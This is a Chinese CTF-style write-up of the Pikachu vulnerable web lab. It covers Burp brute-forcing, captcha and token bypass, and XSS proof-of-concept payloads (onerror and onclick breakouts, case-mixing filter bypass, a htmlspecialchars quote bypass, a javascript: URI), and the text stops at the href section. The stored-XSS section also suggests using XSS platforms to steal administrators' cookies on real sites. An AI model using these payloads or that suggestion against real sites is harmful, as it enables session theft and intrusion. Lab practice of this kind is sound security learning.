@@ -1,0 +1,365 @@
+<!DOCTYPE html><html lang="zh"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Astro v5.9.1"><title>Pikachu 漏洞平台通关记录</title><meta name="title" content="Pikachu 漏洞平台通关记录"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/atom.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/pikachu/"><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/pikachu/"><meta property="og:title" content="Pikachu 漏洞平台通关记录"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/pikachu/"><meta property="twitter:title" content="Pikachu 漏洞平台通关记录"><meta property="twitter:description" content><script type="module">document.addEventListener("DOMContentLoaded",()=>{const a=document.getElementById("article");if(a){const r=a.getElementsByTagName("img");Array.from(r).forEach((e,n)=>{e.alt||(e.alt=`文章配图 ${n+1}`);const t=document.createElement("a");t.setAttribute("data-fancybox","gallery"),t.setAttribute("aria-label",`查看大图：${e.alt}`),t.href=e.src,e.parentNode?.insertBefore(t,e),t.appendChild(e)})}});</script><link rel="stylesheet" href="/_astro/_slug_.C-AkVzb2.css">
+<link rel="stylesheet" href="/_astro/waline.nkDt9Ep-.css">
+<link rel="stylesheet" href="/_astro/_slug_.Dk_-7yif.css">
+<link rel="stylesheet" href="/_astro/_slug_.DEy1TFvp.css">
+<style>#waline[data-astro-cid-cjuph4ok]{margin:2rem 0}
+</style></head> <body class="bg-white"> <header class="relative m-0 px-4 py-4 mb-8" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" aria-label="主导航" data-astro-cid-3ef6ksr2> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <button id="menu-btn" class="md:hidden flex flex-col space-y-1 p-2 text-black" aria-label="打开菜单" aria-expanded="false" aria-controls="menu" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <div id="menu" class="md:hidden absolute top-full left-4 right-4 bg-white rounded-xl shadow-2xl border border-gray-100 backdrop-blur-md hidden mt-3 z-50" role="menu" aria-labelledby="menu-btn" data-astro-cid-3ef6ksr2> <div class="flex flex-col" data-astro-cid-3ef6ksr2> <a href="/" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),a=document.getElementById("menu");e?.addEventListener("click",()=>{const t=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",t?"false":"true"),e.setAttribute("aria-label",t?"打开菜单":"关闭菜单"),a?.classList.toggle("hidden"),e.classList.toggle("open")});e?.addEventListener("keydown",t=>{(t.key==="Enter"||t.key===" ")&&(t.preventDefault(),e.click())});document.addEventListener("keydown",t=>{t.key==="Escape"&&!a?.classList.contains("hidden")&&(a?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单"),e?.focus())});document.addEventListener("click",t=>{!e?.contains(t.target)&&!a?.contains(t.target)&&(a?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单"))});</script>  <main class="min-h-screen" role="main" aria-label="文章内容"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 mb-6 tracking-tight leading-tight"> Pikachu 漏洞平台通关记录 </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2021-05-07T08:47:02.000Z" class="text-[#86868b] tracking-wide"> <time datetime="2021-05-07T08:47:02.000Z"> May 7, 2021 </time> </time>  <span class="text-[#d2d2d7] flex items-center" aria-hidden="true">|</span> <span class="text-[#86868b] tracking-wide" aria-label="阅读时间 11 min read">11 min read</span>   <span class="text-[#d2d2d7] flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-3" aria-label="文章分类">  <a href="/categories/技术.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看分类 技术 下的所有文章"> 技术 </a>  </nav>   <span class="text-[#d2d2d7] flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-2" aria-label="文章标签">  <a href="/tags/CTF.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 CTF 下的所有文章"> CTF </a> <span class="text-[#d2d2d7]" aria-hidden="true">·</span> <a href="/tags/网络安全.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 网络安全 下的所有文章"> 网络安全 </a> <span class="text-[#d2d2d7]" aria-hidden="true">·</span> <a href="/tags/Writeup.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 Writeup 下的所有文章"> Writeup </a>  </nav>  </div> </header>  <nav class="toc" aria-label="文章目录" role="navigation" data-astro-cid-woz2nwfv> <h2 class="toc-title" data-astro-cid-woz2nwfv>文章目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#暴力破解" class="toc-link" aria-label="跳转到：暴力破解" data-astro-cid-woz2nwfv> 1. 暴力破解 </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#基于表单" class="toc-link" aria-label="跳转到：基于表单" data-astro-cid-woz2nwfv> 1.1. 基于表单 </a> </li><li data-astro-cid-woz2nwfv> <a href="#验证码绕过on-server" class="toc-link" aria-label="跳转到：验证码绕过(on server)" data-astro-cid-woz2nwfv> 1.2. 验证码绕过(on server) </a> </li><li data-astro-cid-woz2nwfv> <a href="#验证码绕过on-client" class="toc-link" aria-label="跳转到：验证码绕过(on client)" data-astro-cid-woz2nwfv> 1.3. 验证码绕过(on client) </a> </li><li data-astro-cid-woz2nwfv> <a href="#token绕过" class="toc-link" aria-label="跳转到：token绕过" data-astro-cid-woz2nwfv> 1.4. token绕过 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#cross-site-scripting" class="toc-link" aria-label="跳转到：Cross-Site Scripting" data-astro-cid-woz2nwfv> 2. Cross-Site Scripting </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#反射性xssget" class="toc-link" aria-label="跳转到：反射性xss(get)" data-astro-cid-woz2nwfv> 2.1. 反射性xss(get) </a> </li><li data-astro-cid-woz2nwfv> <a href="#反射性xsspost" class="toc-link" aria-label="跳转到：反射性xss(post)" data-astro-cid-woz2nwfv> 2.2. 反射性xss(post) </a> </li><li data-astro-cid-woz2nwfv> <a href="#存储型xss" class="toc-link" aria-label="跳转到：存储型xss" data-astro-cid-woz2nwfv> 2.3. 存储型xss </a> </li><li data-astro-cid-woz2nwfv> <a href="#dom型xss" class="toc-link" aria-label="跳转到：DOM型xss" data-astro-cid-woz2nwfv> 2.4. DOM型xss </a> </li><li data-astro-cid-woz2nwfv> <a href="#dom型xss-x" class="toc-link" aria-label="跳转到：DOM型xss-x" data-astro-cid-woz2nwfv> 2.5. DOM型xss-x </a> </li><li data-astro-cid-woz2nwfv> <a href="#xss盲打" class="toc-link" aria-label="跳转到：xss盲打" data-astro-cid-woz2nwfv> 2.6. xss盲打 </a> </li><li data-astro-cid-woz2nwfv> <a href="#xss过滤" class="toc-link" aria-label="跳转到：xss过滤" data-astro-cid-woz2nwfv> 2.7. xss过滤 </a> </li><li data-astro-cid-woz2nwfv> <a href="#xss之htmlspecialchars" class="toc-link" aria-label="跳转到：xss之htmlspecialchars" data-astro-cid-woz2nwfv> 2.8. xss之htmlspecialchars </a> </li><li data-astro-cid-woz2nwfv> <a href="#xss之href输出" class="toc-link" aria-label="跳转到：xss之href输出" data-astro-cid-woz2nwfv> 2.9. xss之href输出 </a> </li><li data-astro-cid-woz2nwfv> <a href="#xss之js输出" class="toc-link" aria-label="跳转到：xss之js输出" data-astro-cid-woz2nwfv> 2.10. xss之js输出 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#csrf" class="toc-link" aria-label="跳转到：CSRF" data-astro-cid-woz2nwfv> 3. CSRF </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#csrfget" class="toc-link" aria-label="跳转到：CSRF(get)" data-astro-cid-woz2nwfv> 3.1. CSRF(get) </a> </li><li data-astro-cid-woz2nwfv> <a href="#csrfpost" class="toc-link" aria-label="跳转到：CSRF(post)" data-astro-cid-woz2nwfv> 3.2. CSRF(post) </a> </li><li data-astro-cid-woz2nwfv> <a href="#csrf-token" class="toc-link" aria-label="跳转到：CSRF Token" data-astro-cid-woz2nwfv> 3.3. CSRF Token </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#sql-inject" class="toc-link" aria-label="跳转到：Sql Inject" data-astro-cid-woz2nwfv> 4. Sql Inject </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#数字型注入post" class="toc-link" aria-label="跳转到：数字型注入(post)" data-astro-cid-woz2nwfv> 4.1. 数字型注入(post) </a> </li><li data-astro-cid-woz2nwfv> <a href="#字符型注入" class="toc-link" aria-label="跳转到：字符型注入" data-astro-cid-woz2nwfv> 4.2. 字符型注入 </a> </li><li data-astro-cid-woz2nwfv> <a href="#搜索型注入" class="toc-link" aria-label="跳转到：搜索型注入" data-astro-cid-woz2nwfv> 4.3. 搜索型注入 </a> </li><li data-astro-cid-woz2nwfv> <a href="#xx型注入" class="toc-link" aria-label="跳转到：xx型注入" data-astro-cid-woz2nwfv> 4.4. xx型注入 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#rce" class="toc-link" aria-label="跳转到：RCE" data-astro-cid-woz2nwfv> 5. RCE </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#exec-ping" class="toc-link" aria-label="跳转到：exec “ping”" data-astro-cid-woz2nwfv> 5.1. exec “ping” </a> </li><li data-astro-cid-woz2nwfv> <a href="#exec-evel" class="toc-link" aria-label="跳转到：exec “evel”" data-astro-cid-woz2nwfv> 5.2. exec “evel” </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#file-inclusion" class="toc-link" aria-label="跳转到：File Inclusion" data-astro-cid-woz2nwfv> 6. File Inclusion </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#file-inclusionlocal" class="toc-link" aria-label="跳转到：File Inclusion(local)" data-astro-cid-woz2nwfv> 6.1. File Inclusion(local) </a> </li><li data-astro-cid-woz2nwfv> <a href="#file-inclusionremote" class="toc-link" aria-label="跳转到：File Inclusion(remote)" data-astro-cid-woz2nwfv> 6.2. File Inclusion(remote) </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#unsafe-filedownload" class="toc-link" aria-label="跳转到：Unsafe Filedownload" data-astro-cid-woz2nwfv> 7. Unsafe Filedownload </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#unsafe-filedownload-1" class="toc-link" aria-label="跳转到：Unsafe Filedownload" data-astro-cid-woz2nwfv> 7.1. Unsafe Filedownload </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#unsafe-fileupload" class="toc-link" aria-label="跳转到：Unsafe Fileupload" data-astro-cid-woz2nwfv> 8. Unsafe Fileupload </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#client-check" class="toc-link" aria-label="跳转到：client check" data-astro-cid-woz2nwfv> 8.1. client check </a> </li><li data-astro-cid-woz2nwfv> <a href="#mime-type" class="toc-link" aria-label="跳转到：MIME type" data-astro-cid-woz2nwfv> 8.2. MIME type </a> </li><li data-astro-cid-woz2nwfv> <a href="#getimagesize" class="toc-link" aria-label="跳转到：getimagesize" data-astro-cid-woz2nwfv> 8.3. getimagesize </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#over-permission" class="toc-link" aria-label="跳转到：Over Permission" data-astro-cid-woz2nwfv> 9. Over Permission </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#水平越权" class="toc-link" aria-label="跳转到：水平越权" data-astro-cid-woz2nwfv> 9.1. 水平越权 </a> </li><li data-astro-cid-woz2nwfv> <a href="#垂直越权" class="toc-link" aria-label="跳转到：垂直越权" data-astro-cid-woz2nwfv> 9.2. 垂直越权 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#" class="toc-link" aria-label="跳转到：../../" data-astro-cid-woz2nwfv> 10. ../../ </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#目录遍历" class="toc-link" aria-label="跳转到：目录遍历" data-astro-cid-woz2nwfv> 10.1. 目录遍历 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#敏感信息泄露" class="toc-link" aria-label="跳转到：敏感信息泄露" data-astro-cid-woz2nwfv> 11. 敏感信息泄露 </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#icanseeyourabc" class="toc-link" aria-label="跳转到：IcanseeyourABC" data-astro-cid-woz2nwfv> 11.1. IcanseeyourABC </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#url重定向" class="toc-link" aria-label="跳转到：URL重定向" data-astro-cid-woz2nwfv> 12. URL重定向 </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#不安全的url跳转" class="toc-link" aria-label="跳转到：不安全的URL跳转" data-astro-cid-woz2nwfv> 12.1. 不安全的URL跳转 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#ssrf" class="toc-link" aria-label="跳转到：SSRF" data-astro-cid-woz2nwfv> 13. SSRF </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#ssrfcurl" class="toc-link" aria-label="跳转到：SSRF(curl)" data-astro-cid-woz2nwfv> 13.1. SSRF(curl) </a> </li><li data-astro-cid-woz2nwfv> <a href="#ssrffile_get_content" class="toc-link" aria-label="跳转到：SSRF(file_get_content)" data-astro-cid-woz2nwfv> 13.2. SSRF(file_get_content) </a> </li> </ol> </li> </ol> </nav>  <script type="module">document.querySelectorAll(".toc-link").forEach(o=>{o.addEventListener("click",t=>{t.preventDefault();const e=o.getAttribute("href")?.slice(1);if(e){const i=document.getElementById(e);if(i){const c=i.getBoundingClientRect().top+window.pageYOffset-100;window.scrollTo({top:c,behavior:"smooth"})}}})});const s=new IntersectionObserver(o=>{const t=o.filter(e=>e.isIntersecting);if(t.length>0){const i=t.reduce((n,c)=>n.boundingClientRect.top<c.boundingClientRect.top?n:c).target.id;document.querySelectorAll(".toc-link.active").forEach(n=>n.classList.remove("active"));const r=document.querySelector(`.toc-link[href="#${i}"]`);r&&r.classList.add("active")}},{rootMargin:"-10% 0px -70% 0px",threshold:[0,.5,1]});document.querySelectorAll(".toc-link").forEach(o=>{const t=o.getAttribute("href")?.slice(1);if(t){const e=document.getElementById(t);e&&s.observe(e)}});</script>  <div class="fancybox-container">  <section id="article" class="prose prose-lg max-w-none" aria-label="文章正文">   <blockquote>
+<p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">Pikachu</a> 是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。<!--more--></p>
+</blockquote>
+<h2 id="暴力破解">暴力破解</h2>
+<h3 id="基于表单">基于表单</h3>
+<p><code>burp</code> 抓包使用 <code>Clusterbomb</code> 类型爆破</p>
+<p><img src="https://img.5ime.cn/pikachu/image1.png" alt="图片"></p>
+<h3 id="验证码绕过on-server">验证码绕过(on server)</h3>
+<p>抓包请求后发现 只要页面不刷新 验证码就不会改变 爆破方法同上</p>
+<p><img src="https://img.5ime.cn/pikachu/image2.png" alt="图片"></p>
+<h3 id="验证码绕过on-client">验证码绕过(on client)</h3>
+<p>验证码是 <code>js</code> 前端校验 直接抓包 无视 <code>js</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image3.png" alt="图片"></p>
+<h3 id="token绕过">token绕过</h3>
+<p>攻击类型选择：<code>音叉</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image4.png" alt="图片"></p>
+<p>打开Intruder->Options设置如下参数</p>
+<p>请求线程数选择：<code>1</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image5.png" alt="图片"></p>
+<p><img src="https://img.5ime.cn/pikachu/image6.png" alt="图片"></p>
+<p>重定向选择：<code>总是</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image7.png" alt="图片"></p>
+<p>在 <code>Payloads</code> 里面选择 <code>递归搜索</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image8.png" alt="图片"></p>
+<p><img src="https://img.5ime.cn/pikachu/image9.png" alt="图片"></p>
+<h2 id="cross-site-scripting">Cross-Site Scripting</h2>
+<h3 id="反射性xssget">反射性xss(get)</h3>
+<p>发现有 <code>20</code> 个字符限制，直接改为 <code>100</code> 即可</p>
+<p><img src="https://img.5ime.cn/pikachu/image10.png" alt="图片"></p>
+<p>题目是 <code>get</code> 看了下 <code>url</code> 发现提交的参数在 <code>url</code> 后面直接在 <code>url</code> 后面补全也行。</p>
+<p><img src="https://img.5ime.cn/pikachu/image11.png" alt="图片"></p>
+<h3 id="反射性xsspost">反射性xss(post)</h3>
+<p>这题对着框搞了半天 看了下提示才知道需要先登录，账号密码还是 <code>admin</code> / <code>123456</code></p>
+<p>登录后直接输入payload：<code>&#x3C;script>alert(1)&#x3C;/script></code></p>
+<p><img src="https://img.5ime.cn/pikachu/image12.png" alt="图片"></p>
+<h3 id="存储型xss">存储型xss</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line" data-line="1"><span style="color:#E1E4E8">payload：</span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">script</span><span style="color:#F97583">></span><span style="color:#B392F0">alert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x3C;/</span><span style="color:#E1E4E8">script</span><span style="color:#F97583">></span></span></code></pre>
+<p>存储型主要是 你提交的代码会存到数据库中，有用户访问这个页面就会从数据库提取出 <code>xss数据</code> 所以会弹框
+可以搭配一些 <code>xss在线平台</code> 找一些有存储型xss漏洞的网站钓管理员 <code>cookies</code></p>
+<h3 id="dom型xss">DOM型xss</h3>
+<p>提交 <code>payload</code> 后出现一个 <code>what do you see？</code> 点击后 <code>403</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image13.png" alt="图片"></p>
+<p><code>f12</code> 可以看到我们提交的数据变成了超链接</p>
+<p><img src="https://img.5ime.cn/pikachu/image14.png" alt="图片"></p>
+<p>看下 <code>js</code> 代码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line" data-line="1"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">  function domxss(){</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">  	var str </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> document.</span><span style="color:#B392F0">getElementById</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"text"</span><span style="color:#E1E4E8">).value;</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">  	document.</span><span style="color:#B392F0">getElementById</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"dom"</span><span style="color:#E1E4E8">).innerHTML </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "&#x3C;a href='"</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">str</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">"'>what do you see?&#x3C;/a>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">  	}</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span></code></pre>
+<p>直接闭合使用 <code>onclick</code> 弹出</p>
+<p><img src="https://img.5ime.cn/pikachu/image15.png" alt="图片"></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line" data-line="1"><span style="color:#9ECBFF">' onclick="alert(1)"</span><span style="color:#FDAEB7;font-style:italic">></span></span>
+<span class="line" data-line="2"><span style="color:#9ECBFF">'>&#x3C;img src='' onerror=alert("1")></span><span style="color:#FDAEB7;font-style:italic"> </span></span></code></pre>
+<h3 id="dom型xss-x">DOM型xss-x</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line" data-line="1"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">	function domxss(){</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">	var str </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> window.location.search;</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">	var txss </span><span style="color:#F97583">=</span><span style="color:#B392F0"> decodeURIComponent</span><span style="color:#E1E4E8">(str.</span><span style="color:#B392F0">split</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"text="</span><span style="color:#E1E4E8">)[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">	var xss </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> txss.</span><span style="color:#B392F0">replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">/</span><span style="color:#85E89D;font-weight:bold">\+</span><span style="color:#9ECBFF">/</span><span style="color:#F97583">g</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">' '</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">	document.</span><span style="color:#B392F0">getElementById</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"dom"</span><span style="color:#E1E4E8">).innerHTML </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "&#x3C;a href='"</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">xss</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">"'>就让往事都随风,都随风吧&#x3C;/a>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">	}</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span></code></pre>
+<p>这题加了个正则替换把 <code>空格</code> 替换成了 <code>+</code> 号，<code>payload</code> 同上</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line" data-line="1"><span style="color:#9ECBFF">' onclick="alert(1)"</span><span style="color:#FDAEB7;font-style:italic">></span></span>
+<span class="line" data-line="2"><span style="color:#9ECBFF">'>&#x3C;img src='' onerror=alert("1")></span><span style="color:#FDAEB7;font-style:italic"> </span></span></code></pre>
+<h3 id="xss盲打">xss盲打</h3>
+<p>盲打就是在一切能插入的地方插入 <code>xss</code> 代码</p>
+<p>看了下提示 需要登录后台，<code>xss</code> 插入成功</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line" data-line="1"><span style="color:#E1E4E8">payload：</span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">script</span><span style="color:#F97583">></span><span style="color:#B392F0">alert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x3C;/</span><span style="color:#E1E4E8">script</span><span style="color:#F97583">></span></span></code></pre>
+<p><img src="https://img.5ime.cn/pikachu/image16.png" alt="图片"></p>
+<p><img src="https://img.5ime.cn/pikachu/image17.png" alt="图片"></p>
+<h3 id="xss过滤">xss过滤</h3>
+<p>输入 <code>&#x3C;script>alert(1)&#x3C;/script></code></p>
+<p><img src="https://img.5ime.cn/pikachu/image18.png" alt="图片"></p>
+<p>输入 <code>alert(1)</code> 输入 <code>123</code> 返回 <code>了别说这些'123'的话,不要怕,就是干!</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image19.png" alt="图片"></p>
+<p>应该是过滤了 <code>&#x3C;script>*&#x3C;/scipt</code></p>
+<p>大小写混写直接绕过</p>
+<p><img src="https://img.5ime.cn/pikachu/image20.png" alt="图片"></p>
+<p>试了下其他方法也绕过了 更加确信过滤了 <code>&#x3C;script>*&#x3C;/scipt</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image21.png" alt="图片"></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line" data-line="1"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#79B8FF">scriPt</span><span style="color:#E1E4E8">>alert(1) &#x3C;/</span><span style="color:#79B8FF">scriPt</span><span style="color:#E1E4E8">></span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">img</span><span style="color:#B392F0"> src</span><span style="color:#FDAEB7;font-style:italic">=x</span><span style="color:#B392F0"> onerror</span><span style="color:#FDAEB7;font-style:italic">=alert("1")></span><span style="color:#E1E4E8"> </span></span></code></pre>
+<h3 id="xss之htmlspecialchars">xss之htmlspecialchars</h3>
+<p><code>htmlspecialchars</code>：将 <code>特殊字符</code> 转换为 <code>HTML 实体</code></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th align="left">字符</th><th align="left">替换后</th></tr></thead><tbody><tr><td align="left">&#x26;(&#x26; 符号)</td><td align="left">&#x26;</td></tr><tr><td align="left">“(双引号)</td><td align="left">“，除非设置了ENT_NOQUOTES**</td></tr><tr><td align="left">‘(单引号)</td><td align="left">设置了ENT_QUOTES后，(如果是ENT_HTML401) ，或者’(如果是ENT_XML1、ENT_XHTML或ENT_HTML5**)。</td></tr><tr><td align="left">&#x3C;(小于)</td><td align="left">&#x3C;</td></tr><tr><td align="left">>(大于)</td><td align="left">></td></tr></tbody></table>
+<p><code>htmlspecialchars</code> 默认不对 <code>单引号</code> 继续进行转换</p>
+<p><img src="https://img.5ime.cn/pikachu/image22.png" alt="图片"></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line" data-line="1"><span style="color:#9ECBFF">' onclick='</span><span style="color:#B392F0">alert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">'</span><span style="color:#FDAEB7;font-style:italic">></span></span></code></pre>
+<h3 id="xss之href输出">xss之href输出</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line" data-line="1"><span style="color:#B392F0">javascript</span><span style="color:#E1E4E8">: </span><span style="color:#B392F0">alert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">);</span></span>
